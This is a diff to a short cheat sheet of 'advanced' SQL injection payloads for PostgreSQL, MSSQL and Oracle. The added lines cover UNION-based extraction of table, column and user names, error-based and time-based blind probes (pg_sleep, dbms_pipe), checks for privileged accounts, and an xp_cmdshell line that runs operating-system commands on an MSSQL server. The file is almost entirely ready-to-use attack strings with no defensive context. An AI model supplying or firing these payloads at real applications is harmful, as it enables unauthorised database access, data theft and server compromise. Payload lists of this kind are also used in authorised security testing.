@@ -1,13 +1,28 @@
 Some Advanced SQL injections 
 
--- PostgreSQL
+PostgreSQL :-
+
 ' UNION SELECT version(),current_database()--
 ' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+' OR pg_sleep(5)--
+' OR current_database()='postgres'--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
 
--- MSSQL
+MSSQL :-
+
 ' UNION SELECT @@version--
 ' AND 1=CONVERT(int,(SELECT name FROM master..sysdatabases))--
+' OR 1=(SELECT COUNT(*) FROM sysobjects)--
+'; EXEC xp_cmdshell('dir')--
+' AND SUSER_NAME()='sa'--
+' OR db_name()=N'master'--
 
--- Oracle
+Oracle :-
+
 ' UNION SELECT banner FROM v$version--
 ' AND 1=utl_inaddr.get_host_name('127.0.0.1')--
+' OR dbms_pipe.receive_message('a',5)--
+' OR 1=(SELECT COUNT(*) FROM all_users)--
+' UNION SELECT username FROM all_users--
+' UNION SELECT table_name FROM all_tables--
